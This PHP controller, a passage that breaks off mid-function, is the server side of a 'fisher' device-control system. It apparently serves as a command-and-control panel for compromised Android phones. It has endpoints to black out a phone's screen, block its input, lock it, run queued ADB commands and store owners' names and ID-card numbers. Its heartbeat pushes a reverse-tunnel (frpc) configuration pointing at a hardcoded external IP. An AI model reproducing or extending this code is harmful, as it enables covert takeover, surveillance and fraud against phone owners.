<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;

class DeviceController extends BaseController
{
    private function currentActor(): array
    {
        $payload = $this->request->user ?? $this->request->userPayload ?? [];
        $query = Db::table('fisher_users');
        if (!empty($payload['user_id'])) {
            $query->where('id', (int)$payload['user_id']);
        } elseif (!empty($payload['username'])) {
            $query->where('username', (string)$payload['username']);
        } else {
            return [];
        }

        $row = $query->find();
        if (!$row) return [];
        $row['user_id'] = $row['id'] ?? ($payload['user_id'] ?? null);
        return $row;
    }

    private function isSuperAdmin(array $actor): bool
    {
        return in_array($actor['role'] ?? '', ['superadmin', 'super-admin'], true);
    }

    /**
     * null 表示超级管理员可访问全部账号；数组表示当前账号的设备归属范围。
     */
    private function managedUsernames(array $actor): ?array
    {
        if ($this->isSuperAdmin($actor)) return null;

        $username = trim((string)($actor['username'] ?? ''));
        if ($username === '') return [];
        if (($actor['role'] ?? 'user') !== 'admin') return [$username];

        $children = Db::table('fisher_users')
            ->where('parent_username', $username)
            ->column('username');
        return array_values(array_unique(array_filter(array_merge([$username], $children), 'strlen')));
    }

    private function findAuthorizedDevice(string $deviceId, ?array $actor = null): ?array
    {
        $actor = $actor ?? $this->currentActor();
        if (!$actor || $deviceId === '') return null;

        $query = Db::table('fisher_devices')->where('device_id', $deviceId);
        $scope = $this->managedUsernames($actor);
        if ($scope !== null) {
            if (!$scope) return null;
            $query->whereIn('owner_username', $scope);
        }
        return $query->find() ?: null;
    }

    private function deviceNotFound()
    {
        // 对无权访问和真实不存在统一返回 404，避免通过接口枚举设备 ID。
        return json(['success' => false, 'message' => 'Device not found'], 404);
    }

    private function auditDeviceSecurity(string $action, array $details = []): void
    {
        $actor = $this->request->user ?? $this->request->userPayload ?? [];
        $record = [
            'time' => date('c'),
            'action' => $action,
            'actor_id' => $actor['user_id'] ?? null,
            'actor_username' => $actor['username'] ?? '',
            'actor_role' => $actor['role'] ?? '',
            'ip' => $this->request->ip(),
            'details' => $details,
        ];
        @file_put_contents(
            runtime_path() . 'security_audit.log',
            json_encode($record, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . PHP_EOL,
            FILE_APPEND | LOCK_EX
        );
    }

    /**
     * GET /api/device/list
     * 设备列表（超级管理员查全部，管理员查自己和直属子账号，普通用户查自己）
     */
    public function listDevices()
    {
        $user = $this->currentActor();
        $scope = $this->managedUsernames($user);
        $query = Db::table('fisher_devices');
        if ($scope !== null) {
            $query->whereIn('owner_username', $scope ?: ['__no_authorized_owner__']);
        }
        $rows = $query->order('last_seen', 'desc')->select()->toArray();

        $onlineInfo = $this->getOnlineDevices();
        $devices = array_map(function ($row) use ($onlineInfo) {
            return $this->deviceToDict($row, $onlineInfo);
        }, $rows);
        return json(['success' => true, 'data' => $devices, 'message' => 'success']);
    }

    /**
     * GET /api/device/:id
     * 设备详情
     */
    public function getDevice($id)
    {
        $row = $this->findAuthorizedDevice((string)$id);
        if (!$row) return $this->deviceNotFound();
        $onlineInfo = $this->getOnlineDevices();
        $data = $this->deviceToDict($row, $onlineInfo);
        return json(['success' => true, 'data' => $data, 'message' => 'success']);
    }

    /**
     * DELETE /api/device/:id
     * 删除设备（管理员在授权范围内删除，普通用户只能取消自己的绑定）
     */
    public function deleteDevice($id)
    {
        $user = $this->currentActor();
        $role = $user['role'] ?? 'user';
        $row = $this->findAuthorizedDevice((string)$id, $user);
        if (!$row) return $this->deviceNotFound();

        if (in_array($role, ['admin', 'superadmin', 'super-admin'])) {
            Db::table('fisher_devices')->where('device_id', $id)->delete();
            $this->auditDeviceSecurity('device.delete', [
                'device_id' => (string)$id,
                'previous_owner' => $row['owner_username'] ?? '',
            ]);
            return json(['success' => true, 'data' => null, 'message' => '设备已删除']);
        } else {
            Db::table('fisher_devices')
                ->where('device_id', $id)
                ->where('owner_username', $user['username'] ?? '')
                ->update(['owner_username' => '']);
            $this->auditDeviceSecurity('device.unbind_self', [
                'device_id' => (string)$id,
                'previous_owner' => $row['owner_username'] ?? '',
            ]);
            return json(['success' => true, 'data' => null, 'message' => '设备已取消绑定']);
        }
    }

    /**
     * PUT /api/device/:id/assign
     * 分配设备
     */
    public function assignDevice($id)
    {
        $data = Request::post();
        $username = trim((string)($data['username'] ?? ''));
        if (!$username) {
            return json(['success' => false, 'message' => 'Missing username'], 400);
        }

        $actor = $this->currentActor();
        $role = $actor['role'] ?? 'user';
        if (!in_array($role, ['admin', 'superadmin', 'super-admin'], true)) {
            $this->auditDeviceSecurity('device.assign_denied', [
                'device_id' => (string)$id,
                'target_username' => $username,
                'reason' => 'role_not_allowed',
            ]);
            return json(['success' => false, 'message' => '普通用户不能分配设备'], 403);
        }

        $device = $this->findAuthorizedDevice((string)$id, $actor);
        if (!$device) return $this->deviceNotFound();

        $target = Db::table('fisher_users')->where('username', $username)->find();
        if (!$target) {
            return json(['success' => false, 'message' => '目标用户不存在'], 404);
        }
        if (!(bool)($target['enabled'] ?? false)) {
            return json(['success' => false, 'message' => '目标用户已被禁用'], 400);
        }
        if (!empty($target['expire_at']) && (int)$target['expire_at'] < time()) {
            return json(['success' => false, 'message' => '目标用户已过期'], 400);
        }

        $scope = $this->managedUsernames($actor);
        if ($scope !== null && !in_array($username, $scope, true)) {
            $this->auditDeviceSecurity('device.assign_denied', [
                'device_id' => (string)$id,
                'target_username' => $username,
                'reason' => 'target_out_of_scope',
            ]);
            return json(['success' => false, 'message' => '不能将设备分配给管理范围外的账号'], 403);
        }

        $previousOwner = (string)($device['owner_username'] ?? '');
        // Device assignment is intentionally unlimited. Keep the legacy
        // max_devices column for compatibility with existing accounts and
        // API responses, but do not reject assignments based on it.

        if ($previousOwner !== $username) {
            $updated = Db::table('fisher_devices')
                ->where('device_id', $id)
                ->where('owner_username', $previousOwner)
                ->update(['owner_username' => $username]);
            if ($updated !== 1) {
                return json(['success' => false, 'message' => '设备归属已发生变化，请刷新后重试'], 409);
            }
        }

        $this->auditDeviceSecurity('device.assign', [
            'device_id' => (string)$id,
            'previous_owner' => $previousOwner,
            'target_username' => $username,
        ]);
        return json(['success' => true, 'data' => null, 'message' => "设备已下发到 {$username}"]);
    }

    /**
     * PUT /api/device/:id/group
     * 设置分组
     */
    public function setGroup($id)
    {
        if (!$this->findAuthorizedDevice((string)$id)) return $this->deviceNotFound();
        $data = Request::post();
        $groupName = $data['groupName'] ?? '';
        Db::table('fisher_devices')->where('device_id', $id)->update(['group_name' => $groupName]);
        return json(['success' => true, 'data' => null, 'message' => '设置分组成功']);
    }

    /**
     * PUT /api/device/:id/remark
     * 设置备注
     */
    public function setRemark($id)
    {
        $deviceId = (string)$id;
        if (!$this->findAuthorizedDevice($deviceId)) return $this->deviceNotFound();
        $data = Request::post();
        $remark = isset($data['remark']) ? (string)$data['remark'] : '';
        $updated = Db::table('fisher_devices')
            ->where('device_id', $deviceId)
            ->update(['remark' => $remark]);
        if ($updated === false) {
            return json(['success' => false, 'message' => '备注保存失败'], 500);
        }

        $saved = $this->findAuthorizedDevice($deviceId);
        if (!$saved || (string)($saved['remark'] ?? '') !== $remark) {
            return json(['success' => false, 'message' => '备注保存校验失败'], 500);
        }
        return json([
            'success' => true,
            'data' => ['device_id' => $deviceId, 'remark' => (string)($saved['remark'] ?? '')],
            'message' => 'success',
        ]);
    }

    /**
     * PUT /api/device/:id/real-name
     * 设置实名信息
     */
    public function setRealName($id)
    {
        if (!$this->findAuthorizedDevice((string)$id)) return $this->deviceNotFound();
        $data = Request::post();
        $updates = [];
        if (isset($data['realName'])) $updates['real_name'] = $data['realName'];
        if (isset($data['idCard'])) $updates['id_card'] = $data['idCard'];
        if (isset($data['expiryDate'])) $updates['expiry_date'] = $data['expiryDate'];
        if (isset($data['otherInfo'])) $updates['other_info'] = $data['otherInfo'];

        if ($updates) {
            Db::table('fisher_devices')->where('device_id', $id)->update($updates);
        }
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * PUT /api/device/:id/toggle-black-screen
     */
    public function toggleBlackScreen($id)
    {
        $row = $this->findAuthorizedDevice((string)$id);
        if (!$row) return $this->deviceNotFound();
        $current = $row['black_screen_active'] ?? 0;
        Db::table('fisher_devices')->where('device_id', $id)->update(['black_screen_active' => $current ? 0 : 1]);
        return json(['success' => true, 'data' => ['black_screen_active' => !$current], 'message' => 'success']);
    }

    /**
     * PUT /api/device/:id/toggle-screen
     */
    public function toggleScreen($id)
    {
        $row = $this->findAuthorizedDevice((string)$id);
        if (!$row) return $this->deviceNotFound();
        $current = $row['is_screen_on'] ?? 1;
        Db::table('fisher_devices')->where('device_id', $id)->update(['is_screen_on' => $current ? 0 : 1]);
        return json(['success' => true, 'data' => ['is_screen_on' => !$current], 'message' => 'success']);
    }

    /**
     * PUT /api/device/:id/toggle-device-owner
     */
    public function toggleDeviceOwner($id)
    {
        $row = $this->findAuthorizedDevice((string)$id);
        if (!$row) return $this->deviceNotFound();
        $current = $row['is_device_owner'] ?? 0;
        Db::table('fisher_devices')->where('device_id', $id)->update(['is_device_owner' => $current ? 0 : 1]);
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * PUT /api/device/:id/toggle-device-input
     */
    public function toggleDeviceInput($id)
    {
        $row = $this->findAuthorizedDevice((string)$id);
        if (!$row) return $this->deviceNotFound();
        $current = $row['device_input_blocked'] ?? 0;
        Db::table('fisher_devices')->where('device_id', $id)->update(['device_input_blocked' => $current ? 0 : 1]);
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * PUT /api/device/:id/lock-screen
     */
    public function lockScreen($id)
    {
        if (!$this->findAuthorizedDevice((string)$id)) return $this->deviceNotFound();
        $data = Request::post();
        $type = $data['type'] ?? 'pin';
        Db::table('fisher_devices')->where('device_id', $id)->update(['lock_screen_type' => $type]);
        // 发送命令到设备（通过命令队列）
        $this->enqueueCommand($id, ['method' => 'lockScreen', 'params' => ['type' => $type]]);
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * PUT /api/device/:id/unlock-screen
     */
    public function unlockScreen($id)
    {
        if (!$this->findAuthorizedDevice((string)$id)) return $this->deviceNotFound();
        Db::table('fisher_devices')->where('device_id', $id)->update(['lock_screen_type' => '']);
        $this->enqueueCommand($id, ['method' => 'unlockScreen', 'params' => []]);
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * PUT /api/device/:id/reboot
     */
    public function reboot($id)
    {
        if (!$this->findAuthorizedDevice((string)$id)) return $this->deviceNotFound();
        $this->enqueueCommand($id, ['method' => 'reboot', 'params' => []]);
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * PUT /api/device/:id/shutdown
     */
    public function shutdown($id)
    {
        if (!$this->findAuthorizedDevice((string)$id)) return $this->deviceNotFound();
        $this->enqueueCommand($id, ['method' => 'shutdown', 'params' => []]);
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    // ==================== 分组 ====================

    /**
     * GET /api/device/groups
     */
    public function listGroups()
    {
        $rows = Db::table('fisher_device_groups')->order('id', 'asc')->select()->toArray();
        $groups = array_map(function ($r) {
            return ['id' => $r['id'], 'name' => $r['name']];
        }, $rows);
        return json(['success' => true, 'data' => ['groups' => $groups], 'message' => 'success']);
    }

    /**
     * POST /api/device/groups
     */
    public function addGroup()
    {
        $data = Request::post();
        $name = trim($data['name'] ?? '');
        if (!$name) {
            return json(['success' => false, 'message' => '分组名称不能为空'], 400);
        }
        $exists = Db::table('fisher_device_groups')->where('name', $name)->find();
        if ($exists) {
            return json(['success' => false, 'message' => '分组已存在'], 400);
        }
        Db::table('fisher_device_groups')->insert(['name' => $name, 'created_at' => time()]);
        return json(['success' => true, 'data' => null, 'message' => '分组已添加']);
    }

    /**
     * DELETE /api/device/groups/:id
     */
    public function deleteGroup($id)
    {
        $row = Db::table('fisher_device_groups')->where('id', $id)->find();
        if ($row) {
            Db::table('fisher_devices')->where('group_name', $row['name'])->update(['group_name' => '']);
        }
        Db::table('fisher_device_groups')->where('id', $id)->delete();
        return json(['success' => true, 'data' => null, 'message' => '分组已删除']);
    }

    // ==================== WS 重连 ====================

    /**
     * POST /api/device/reconnect-ws
     * ★ 2026-08-06：完整实现 — 通过 Node WS 内部 HTTP API 触发 APK 唤醒
     * 流程：
     *   1. 检查当前 Node WS 池中设备是否已有连接
     *   2. 若无 → 通过 /api/tunnel/config 或 Node WS 内部 endpoint 推送 reconnect 指令
     *   3. 返回唤醒状态给前端
     */
    public function reconnectWs()
    {
        $deviceId = Request::post('deviceId', Request::get('deviceId', ''));
        if (!$deviceId) {
            return json(['success' => false, 'message' => 'deviceId required']);
        }
        if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();

        // 1. 通过 Node WS 内部 HTTP 接口查询当前设备 WS 连接状态
        $wsBaseUrl = env('WS.BASE_URL', 'http://127.0.0.1:8889');
        $ctx = stream_context_create(['http' => ['timeout' => 3, 'method' => 'GET']]);
        $resp = @file_get_contents($wsBaseUrl . '/online-devices', false, $ctx);
        $online = $resp ? json_decode($resp, true) : null;

        $alreadyOnline = false;
        if ($online && is_array($online)) {
            $alreadyOnline = in_array($deviceId, $online['devices'] ?? [], true)
                          || in_array($deviceId, $online['bridges'] ?? [], true);
        }

        if ($alreadyOnline) {
            return json([
                'success' => true,
                'data' => ['deviceId' => $deviceId, 'alreadyOnline' => true],
                'message' => '设备已在线，无需唤醒'
            ]);
        }

        // 2. 通过 /internal/reconnect-device 触发 Node WS 内部唤醒
        //    Node WS 内部 endpoint：POST /internal/reconnect-device
        $internalUrl = $wsBaseUrl . '/internal/reconnect-device';
        $postData = http_build_query(['deviceId' => $deviceId]);
        $ctxPost = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/x-www-form-urlencoded',
                'content' => $postData,
                'timeout' => 5,
            ]
        ]);
        $internalResp = @file_get_contents($internalUrl, false, $ctxPost);

        return json([
            'success' => true,
            'data' => [
                'deviceId' => $deviceId,
                'alreadyOnline' => false,
                'wakeupTriggered' => true,
                'internalResp' => $internalResp ? json_decode($internalResp, true) : null,
            ],
            'message' => '唤醒指令已下发，等待设备重连（最多 10 秒）'
        ]);
    }

    // ==================== 设备端回调（白名单内） ====================

    /**
     * GET /api/device/serverHost
     */
    public function serverHost()
    {
        $deviceId = Request::get('deviceId', '');
        $host = Request::host();
        $host = explode(':', $host)[0];
        $externalHost = env('external.external_host', '147.90.182.35');
        if (in_array($host, ['127.0.0.1', 'localhost'])) {
            $host = $externalHost;
        }
        $externalPort = env('external.external_port', '8889');
        return json(['success' => true, 'data' => ['serverHost' => "{$host}:{$externalPort}", 'deviceId' => $deviceId], 'message' => 'success']);
    }

    /**
     * POST /api/device/localServiceHeartbeat
     * local-service 心跳
     */
    public function heartbeat()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? Request::get('deviceId', '');

        if ($deviceId) {
            Db::table('fisher_devices')->where('device_id', $deviceId)->update([
                'local_service_connected' => 1,
                'last_seen' => time(),
            ]);
        }

        $frpcRunning = $data['frpcRunning'] ?? false;
        $responseData = ['status' => 'alive'];

        if (!$frpcRunning) {
            $externalHost = env('external.external_host', '147.90.182.35');
            $externalPort = env('external.external_port', '8889');
            $responseData['commands'] = [
                ['command' => 'setConfig', 'params' => ['frpsAddr' => env('frps.frps_addr', '147.90.182.35'), 'frpsPort' => (int)env('frps.frps_port', 7000), 'frpsToken' => '', 'remotePort' => 10000 + abs(crc32($deviceId)) % 50000]],
                ['command' => 'setServerAddr', 'params' => ['serverAddr' => "http://{$externalHost}:{$externalPort}"]],
                ['command' => 'saveConfig'],
                ['command' => 'startFrpc'],
            ];
        }

        // 广播给管理面板
        static::broadcastToAdmins([
            'type'      => 'device_status_update',
            'deviceId'  => $deviceId,
            'sessionId' => $deviceId,
            'data'      => array_merge($data, ['status' => 'online', 'localServiceConnected' => true]),
        ]);
        // 触发前端刷新设备列表
        static::broadcastToAdmins(['type' => 'device_update']);

        return json(['success' => true, 'data' => $responseData, 'message' => 'success']);
    }

    /**
     * POST /api/device/message
     */
    public function message()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/device/commandResult
     * local-service 命令执行结果
     */
    public function commandResult()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        $commandId = $data['commandId'] ?? '';

        // 存入结果缓存（用设置表或 Redis，这里简单用 settings）
        if ($commandId) {
            Db::table('fisher_settings')->replace([
                'key' => "cmd_result_{$commandId}",
                'value' => json_encode($data, JSON_UNESCAPED_UNICODE),
            ]);
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/device/task/responses
     */
    public function taskResponses()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/device/tasks
     * local-service 获取待执行任务
     */
    public function getTasks()
    {
        $deviceId = Request::get('deviceId', '');
        return json(['success' => true, 'data' => ['tasks' => [], 'deviceId' => $deviceId], 'message' => 'success']);
    }

    /**
     * GET /api/device/pendingCommands
     * local-service 轮询获取待执行命令（核心接口）
     */
    public function pendingCommands()
    {
        $deviceId = Request::get('deviceId', '');
        $commands = [];

        // 从数据库取待执行命令
        if ($deviceId) {
            $rows = Db::table('fisher_pending_commands')
                ->where('device_id', $deviceId)
                ->whereNull('picked_at')
                ->order('created_at', 'asc')
                ->select()->toArray();

            foreach ($rows as $row) {
                $cmd = json_decode($row['command_json'], true);
                if ($cmd) {
                    $commands[] = $cmd;
                }
            }

            // 标记为已取走
            if ($rows) {
                $ids = array_column($rows, 'id');
                Db::table('fisher_pending_commands')
                    ->whereIn('id', $ids)
                    ->update(['picked_at' => time()]);
            }
        }

        
        // [已移除] setServerAddr 导致每次轮询都触发 restartFrpc 循环 kill
        // Go watchdog 会自行管理 frpc 生命周期，不需要每次都发 setServerAddr
        // [已移除] setServerAddr 命令下发（避免触发 restartFrpc 循环，且硬编码地址已改为 env 读取）

        // 始终附加核心命令
        $ts = time();
        // [已移除] localAdbConnect 每次轮询都触发 ADB 自动开启，导致无法手动关闭 ADB
        // 如果需要开启 ADB，可以通过前端按钮手动触发
        // $commands[] = ['id' => "auto-adb-{$ts}", 'method' => 'localAdbConnect', 'command' => 'localAdbConnect', 'params' => (object)[]];

        // ★ 自动推送 deviceId 到设备：如果设备 tunnel_deployed=0 或 remote_port=0，
        // 说明设备还未正确配置 deviceId，通过 pendingCommands 下发 setAppConfig
        // 注意：这依赖 Go pending command switch 是否支持 setAppConfig method
        // 如果不支持，设备会返回 unknown command，不会有副作用
        if ($deviceId) {
            $device = Db::table('fisher_devices')
                ->where('device_id', $deviceId)
                ->field('tunnel_deployed,remote_port')
                ->find();
            if ($device && (!$device['tunnel_deployed'] || !$device['remote_port'])) {
                $externalHost = env('external.external_host', '147.90.182.35');
                $externalPort = env('external.external_port', '8889');
                $commands[] = [
                    'id' => "push-deviceid-{$ts}",
                    'method' => 'setAppConfig',
                    'command' => 'setAppConfig',
                    'params' => [
                        'deviceId' => $deviceId,
                        'serverAddr' => "http://{$externalHost}:{$externalPort}"
                    ]
                ];
            }
        }

        // 直接返回 Go 期望的顶层格式
        return json(['success' => true, 'commands' => $commands]);
    }

    /**
     * POST /api/device/cacheTaskResult
     */
    public function cacheTaskResult()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/device/installLog
     * POST /api/device/install-log
     */
    public function installLog()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    // ==================== ADB ====================

    /**
     * POST /api/device/adb-key
     */
    public function saveAdbKey()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        $publicKey = $data['publicKey'] ?? '';
        $certificate = $data['certificate'] ?? '';
        $wifiPort = $data['wifiPort'] ?? 0;

        if (!$deviceId) {
            return json(['success' => false, 'message' => 'Missing deviceId'], 400);
        }
        if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();

        Db::table('fisher_adb_keys')->insert([
            'device_id'   => $deviceId,
            'public_key'  => $publicKey,
            'certificate' => $certificate,
            'wifi_port'   => $wifiPort,
            'created_at'  => time(),
            'updated_at'  => time(),
        ]);

        // 更新设备 ADB 状态
        Db::table('fisher_devices')->where('device_id', $deviceId)->update([
            'adb_enabled' => 1,
            'wifi_port'   => $wifiPort,
        ]);

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/device/adb-keys
     */
    public function listAdbKeys()
    {
        $deviceId = Request::get('deviceId', '');
        $query = Db::table('fisher_adb_keys');
        if ($deviceId) {
            if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();
            $query->where('device_id', $deviceId);
        } else {
            $scope = $this->managedUsernames($this->currentActor());
            if ($scope !== null) {
                $deviceIds = Db::table('fisher_devices')
                    ->whereIn('owner_username', $scope ?: ['__no_authorized_owner__'])
                    ->column('device_id');
                $query->whereIn('device_id', $deviceIds ?: ['__no_authorized_device__']);
            }
        }
        $rows = $query->order('created_at', 'desc')->select()->toArray();
        return json(['success' => true, 'data' => $rows, 'message' => 'success']);
    }

    /**
     * DELETE /api/device/adb-key/:id
     */
    public function deleteAdbKey($id)
    {
        $key = Db::table('fisher_adb_keys')->where('id', $id)->find();
        if (!$key || !$this->findAuthorizedDevice((string)($key['device_id'] ?? ''))) {
            return json(['success' => false, 'message' => 'ADB key not found'], 404);
        }
        Db::table('fisher_adb_keys')->where('id', $id)->delete();
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/device/adb-deploy
     */
    public function adbDeploy()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        if (!$deviceId) return json(['success' => false, 'message' => 'Missing deviceId'], 400);
        if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();
        $this->enqueueCommand($deviceId, ['method' => 'adbDeploy', 'params' => $data]);
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/device/adb-wifi
     */
    public function adbWifi()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        if (!$deviceId) return json(['success' => false, 'message' => 'Missing deviceId'], 400);
        if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();
        $enable = $data['enable'] ?? true;
        Db::table('fisher_devices')->where('device_id', $deviceId)->update(['adb_wifi_enabled' => $enable ? 1 : 0]);
        $this->enqueueCommand($deviceId, ['method' => 'adbWifi', 'params' => ['enable' => $enable]]);
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/device/adb-command
     */
    public function adbCommand()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        $command = $data['command'] ?? '';
        if (!$deviceId) return json(['success' => false, 'message' => 'Missing deviceId'], 400);
        if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();
        $this->enqueueCommand($deviceId, ['method' => 'adbCommand', 'params' => ['command' => $command]]);
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    // ==================== 数据上报 ====================

    /**
     * POST /api/device/data/screen-monitord
     */
    public function screenMonitor()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/device/upload/video
     */
    public function uploadVideo()
    {
        return json(['success' => true, 'data' => ['url' => ''], 'message' => 'success']);
    }

    /**
     * POST /api/device/blacklist
     */
    public function setBlacklist()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        if ($deviceId) {
            if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();
            $this->enqueueCommand($deviceId, ['method' => 'setBlacklist', 'params' => $data]);
        }
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/device/rewriteDebugPort
     */
    public function rewriteDebugPort()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/device/rewriteRpcConfig
     */
    public function rewriteRpcConfig()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    // ==================== 自定义信息 ====================

    /**
     * POST /api/device-custom-info
     * GET /api/device-custom-info/:deviceId
     */
    public function customInfo()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';

        if (Request::isPost() && $deviceId) {
            if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();
            $updates = [];
            if (isset($data['realName'])) $updates['real_name'] = $data['realName'];
            if (isset($data['idCard'])) $updates['id_card'] = $data['idCard'];
            if (isset($data['expiryDate'])) $updates['expiry_date'] = $data['expiryDate'];
            if (isset($data['otherInfo'])) $updates['other_info'] = $data['otherInfo'];
            if ($updates) {
                Db::table('fisher_devices')->where('device_id', $deviceId)->update($updates);
            }
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/device-custom-info/:deviceId
     */
    public function getCustomInfo($deviceId)
    {
        if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();
        $row = Db::table('fisher_devices')->field('real_name,id_card,expiry_date,other_info')->where('device_id', $deviceId)->find();
        if (!$row) {
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }
        return json(['success' => true, 'data' => [
            'realName'   => $row['real_name'] ?? '',
            'idCard'     => $row['id_card'] ?? '',
            'expiryDate' => $row['expiry_date'] ?? '',
            'otherInfo'  => $row['other_info'] ?? '',
        ], 'message' => 'success']);
    }

    // ==================== 辅助方法 ====================

    /**
     * 设备记录转前端格式
     */
    /**
     * 从 Node.js WS 服务获取当前在线设备列表
     * 返回 ['devices' => [...], 'bridges' => [...]]
     */
    private function getOnlineDevices(): array
    {
        try {
            $ctx = stream_context_create(['http' => ['timeout' => 2]]);
            $resp = @file_get_contents(self::wsBaseUrl() . '/online-devices', false, $ctx);
            if ($resp !== false) {
                $data = json_decode($resp, true);
                if (is_array($data)) {
                    return [
                        'devices' => array_flip($data['devices'] ?? []),
                        'bridges' => array_flip($data['bridges'] ?? []),
                    ];
                }
            }
        } catch (\Throwable $e) {
            // 连接失败时所有设备按 offline 处理
        }
        return ['devices' => [], 'bridges' => []];
    }

    /**
     * IP 地理位置查询（模拟旧 Python _lookup_ip_geo）
     */
    /**
     * 获取设备的地理位置（使用数据库缓存，IP 变化时才重新查询）
     * 与旧 Python 后端 _lookup_ip_geo 的缓存逻辑一致
     */
    private function getGeoLocation(array $row): ?string
    {
        $ip = $row['public_ip'] ?? '';
        $cachedGeo = $row['geo_location'] ?? '';

        if (!$ip || $ip === '127.0.0.1' || str_starts_with($ip, '192.168.') || str_starts_with($ip, '10.')) {
            return null;
        }

        // 如果已有缓存且非空，直接返回
        if ($cachedGeo) {
            return $cachedGeo;
        }

            // 缓存为空，查询 IP 定位服务并保存到数据库（使用中文）
            try {
            $ipApiBase = rtrim((string)env('external.ip_api_url', 'http://ip-api.com/json'), '/');
            $url = $ipApiBase . '/' . rawurlencode($ip) . '?fields=status,message,country,countryCode,regionName,city&lang=zh-CN';
            $json = false;

            if (function_exists('curl_init')) {
                $ch = curl_init($url);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_CONNECTTIMEOUT => 2,
                    CURLOPT_TIMEOUT => 5,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_HTTPHEADER => ['Accept: application/json'],
                ]);
                $json = curl_exec($ch);
                curl_close($ch);
            }

            if (!$json && filter_var(ini_get('allow_url_fopen'), FILTER_VALIDATE_BOOLEAN)) {
                $ctx = stream_context_create(['http' => ['timeout' => 5]]);
                $json = @file_get_contents($url, false, $ctx);
            }

            if ($json) {
                $data = json_decode($json, true);
                if ($data && (($data['status'] ?? 'success') === 'success')) {
                    $country = $data['country'] ?? '';
                    $countryCode = $data['countryCode'] ?? '';
                    $region = $data['regionName'] ?? '';
                    $city = $data['city'] ?? '';

                    if ($countryCode === 'CN') {
                        // 中国：显示 省-市（如 贵州-贵阳）
                        $geo = ($region && $city) ? "{$region}-{$city}" : ($region ?: $city ?: $country);
                    } else {
                        // 国外：显示 国家-地区（如 新加坡、日本-东京）
                        if ($country && $city && $country !== $city) {
                            $geo = "{$country}-{$city}";
                        } else {
                            $geo = $country ?: $city;
                        }
                    }
                    
                    if ($geo) {
                        Db::table('fisher_devices')
                            ->where('device_id', $row['device_id'])
                            ->update(['geo_location' => $geo]);
                        return $geo;
                    }
                }
            }
        } catch (\Throwable $e) {}
        return null;
    }

    /**
     * 设备记录转前端格式（与旧 Python device_to_dict 完全一致）
     */
    private function deviceToDict(array $row, array $onlineInfo = null): array
    {
        $deviceId = $row['device_id'] ?? '';
        $brand = strtoupper($row['brand'] ?? '') ?: 'UNKNOWN';

        // 解析权限 JSON
        $permissions = [];
        $permStr = $row['permissions'] ?? '{}';
        if (is_string($permStr)) {
            $permissions = json_decode($permStr, true) ?: [];
        } elseif (is_array($permStr)) {
            $permissions = $permStr;
        }

        // 判断在线状态 — 基于 WS 连接（与旧 Python 一致：device_id in device_connections）
        $lastSeen = (int)($row['last_seen'] ?? 0);
        if ($onlineInfo === null) {
            $onlineInfo = $this->getOnlineDevices();
        }

        $inDeviceConn = isset($onlineInfo['devices'][$deviceId]);
        $inBridgeConn = isset($onlineInfo['bridges'][$deviceId]);

        if ($inDeviceConn || $inBridgeConn) {
            $status = 'online';
        } else {
            // ★ WS 断开但最近还有心跳（≤180秒）→ sleeping（与前端 deviceStatus() 判定对齐）
            $recentlyActive = $lastSeen > 0 && (time() - $lastSeen) <= 600;  // 2026-08-02 调整为 10 分钟
            $status = $recentlyActive ? 'sleeping' : 'offline';
        }

        $publicIp = $row['public_ip'] ?? '';

        return [
            'id'                     => $deviceId,
